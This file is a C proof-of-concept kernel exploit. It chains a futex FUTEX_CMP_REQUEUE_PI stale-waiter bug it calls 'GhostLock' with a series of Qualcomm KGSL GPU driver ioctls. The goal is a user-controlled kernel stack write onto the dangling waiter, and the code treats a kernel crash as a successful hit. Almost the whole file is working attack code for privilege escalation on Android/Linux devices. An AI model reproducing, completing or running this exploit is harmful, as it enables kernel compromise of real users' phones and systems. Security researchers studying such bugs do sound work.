/**
 * ghostlock64_exploit.c — 64-bit GhostLock + KGSL: Find working CFU path
 *
 * Tests ALL KGSL command paths that might reach add_ibdesc_list CFU
 * at different stack depths, searching for overlap with the GhostLock waiter.
 *
 * ⚠️ KERNEL CRASH = CFU OVERLAP CONFIRMED = SUCCESS
 */
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <pthread.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include <stdint.h>

#define IOC(nr,sz) (((uint32_t)3<<30)|(((uint32_t)(sz))<<16)|(((uint32_t)0x09)<<8)|((uint32_t)(nr)))

static uint32_t f_wait      __attribute__((aligned(4096)));
static uint32_t f_pi_target __attribute__((aligned(4096)));
static uint32_t f_pi_chain  __attribute__((aligned(4096)));
static volatile int ready, owner_ok, kgsl_done;
static volatile int ctx_id;

static long futex(uint32_t *u, int op, uint32_t val, void *to, uint32_t *u2, uint32_t v3) {
    return syscall(SYS_futex, u, op, val, to, u2, v3);
}

/* Crash pattern: if CFU writes this to waiter->task, kernel WILL crash */
static uint64_t crash_pattern = 0x4141414141414141ULL;

static void *waiter(void *a) {
    (void)a;
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    ready = 1; while (!owner_ok) usleep(1000);

    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts); ts.tv_sec += 8;
    long r = futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
    printf("[waiter] GhostLock: ret=%ld errno=%d\n", r, errno);
    printf("[waiter] ⚠️  Stale waiter on kernel stack!\n\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) { printf("[kgsl] open failed\n"); goto out; }

    /* Create context */
    struct { uint32_t f; uint32_t id; } ctx = {0x12, 0};
    r = ioctl(fd, IOC(0x13, 0x08), &ctx);
    printf("[kgsl] CREATE id=%u ret=%d\n", ctx.id, (int)r);
    if (r < 0) { close(fd); goto out; }
    ctx_id = ctx.id;

    /* ibdesc with crash pattern */
    struct { uint64_t ga; uint64_t sw; } __attribute__((aligned(8))) ib;
    ib.ga = 0x0ULL;
    ib.sw = crash_pattern;

    /* ── Test 1: RB_ISSUEIBCMDS compat cmd (known working) ── */
    printf("\n═══ Test 1: RB_ISSUEIBCMDS compat (0xc0140910) ═══\n");
    {
        struct { uint32_t c; uint32_t f; uint32_t p; uint32_t t; uint32_t n; }
            cmd = {ctx.id, 0, (uint32_t)(uintptr_t)&ib, 0, 1};
        errno = 0; r = ioctl(fd, 0xc0140910, &cmd);
        printf("  ret=%d errno=%d %s\n", (int)r, errno,
               r==0?"⚠️ CFU FIRED!":strerror(errno));
    }

    /* ── Test 2: RB_ISSUEIBCMDS compat, numibs=2 (two ibdesc entries) ── */
    printf("\n═══ Test 2: numibs=2 ═══\n");
    {
        struct { uint64_t ga; uint64_t sw; } ib2[2] __attribute__((aligned(8)));
        ib2[0].ga = 0; ib2[0].sw = crash_pattern;
        ib2[1].ga = 0; ib2[1].sw = crash_pattern;
        struct { uint32_t c; uint32_t f; uint32_t p; uint32_t t; uint32_t n; }
            cmd = {ctx.id, 0, (uint32_t)(uintptr_t)ib2, 0, 2};
        errno = 0; r = ioctl(fd, 0xc0140910, &cmd);
        printf("  ret=%d errno=%d %s\n", (int)r, errno,
               r==0?"⚠️ CFU FIRED!":strerror(errno));
    }

    /* ── Test 3: SUBMIT_COMMANDS compat (0xc02c093d) from 64-bit ── */
    printf("\n═══ Test 3: SUBMIT_COMMANDS compat (0xc02c093d) ═══\n");
    {
        /* SUBMIT_COMMANDS compat struct: 44 bytes */
        uint8_t sbuf[48];
        memset(sbuf, 0, 48);
        *(uint32_t*)(sbuf+0x00) = ctx.id;
        *(uint32_t*)(sbuf+0x20) = (uint32_t)(uintptr_t)&ib;
        *(uint32_t*)(sbuf+0x24) = 16;
        *(uint32_t*)(sbuf+0x28) = 1;
        errno = 0; r = ioctl(fd, 0xc02c093d, sbuf);
        printf("  ret=%d errno=%d %s\n", (int)r, errno,
               r==0?"⚠️ CFU FIRED!":strerror(errno));
    }

    /* ── Test 4: SUBMIT_COMMANDS native (0xc038093d) from 64-bit ── */
    printf("\n═══ Test 4: SUBMIT_COMMANDS native (0xc038093d) ═══\n");
    {
        struct {
            uint32_t ctx_id; uint32_t pad;
            uint64_t cmdlist; uint64_t cmdlist_size;
            uint32_t numcmds; uint32_t pad2;
            uint32_t flags; uint32_t pad3;
        } __attribute__((aligned(8))) cmd = {ctx.id, 0, (uint64_t)(uintptr_t)&ib, 16, 1, 0, 0, 0};
        errno = 0; r = ioctl(fd, IOC(0x3d, 0x38), &cmd);
        printf("  ret=%d errno=%d %s\n", (int)r, errno,
               r==0?"⚠️ CFU FIRED!":strerror(errno));
    }

    /* ── Test 5: RB_ISSUEIBCMDS with flag=0x1000 (alt path) ── */
    printf("\n═══ Test 5: RB_ISSUEIBCMDS flag=0x1000 ═══\n");
    {
        struct { uint32_t c; uint32_t f; uint32_t p; uint32_t t; uint32_t n; }
            cmd = {ctx.id, 0x1000, (uint32_t)(uintptr_t)&ib, 0, 1};
        errno = 0; r = ioctl(fd, 0xc0140910, &cmd);
        printf("  ret=%d errno=%d %s\n", (int)r, errno,
               r==0?"⚠️ CFU FIRED!":strerror(errno));
    }

    /* ── Test 6: GPU_COMMAND (0x3e) ── */
    printf("\n═══ Test 6: GPU_COMMAND (0x3e) ═══\n");
    {
        uint8_t buf[256] = {0};
        *(uint32_t*)&buf[0] = ctx.id;
        errno = 0; r = ioctl(fd, IOC(0x3e, 0x38), buf);
        printf("  ret=%d errno=%d %s\n", (int)r, errno, strerror(errno));
    }

    /* ── Test 7: GPU_AUX_COMMAND (0x57) ── */
    printf("\n═══ Test 7: GPU_AUX_COMMAND (0x57) ═══\n");
    {
        uint8_t buf[256] = {0};
        *(uint32_t*)&buf[0] = ctx.id;
        errno = 0; r = ioctl(fd, IOC(0x57, 0x14), buf);
        printf("  64-bit cmd: ret=%d errno=%d %s\n", (int)r, errno, strerror(errno));
        errno = 0; r = ioctl(fd, 0xc0140957, buf); // compat
        printf("  compat cmd: ret=%d errno=%d %s\n", (int)r, errno, strerror(errno));
    }

    ioctl(fd, IOC(0x14, 0x04), &ctx.id);
    close(fd);
out:
    futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
    kgsl_done = 1;
    return 0;
}

static void *owner(void *a) {
    (void)a;
    futex(&f_pi_target, FUTEX_LOCK_PI, 0, 0, 0, 0);
    owner_ok = 1; while (!ready) usleep(1000);
    usleep(500000);
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    while (!kgsl_done) sleep(1);
    return 0;
}

int main(void) {
    printf("╔══════════════════════════════════════════╗\n");
    printf("║  64-bit GhostLock + KGSL CFU SCAN       ║\n");
    printf("║  ⚠️  KERNEL CRASH = CFU OVERLAP!       ║\n");
    printf("╚══════════════════════════════════════════╝\n\n");

    f_wait=0; f_pi_target=0; f_pi_chain=0;

    pthread_t wt, ot;
    pthread_create(&wt, 0, waiter, 0);
    usleep(200000);
    pthread_create(&ot, 0, owner, 0);
    usleep(300000);

    printf("[trigger] FUTEX_CMP_REQUEUE_PI...\n");
    for (int i = 0; i < 100; i++) {
        long r = futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void*)1, &f_pi_target, 0);
        if (r >= 0) { printf("[trigger] ✅ GhostLock! ret=%ld\n\n", r); break; }
        usleep(1000);
    }

    while (!kgsl_done) sleep(1);
    pthread_join(wt, 0); pthread_join(ot, 0);
    printf("\n=== KERNEL SURVIVED (no CFU overlap found) ===\n");
    return 0;
}
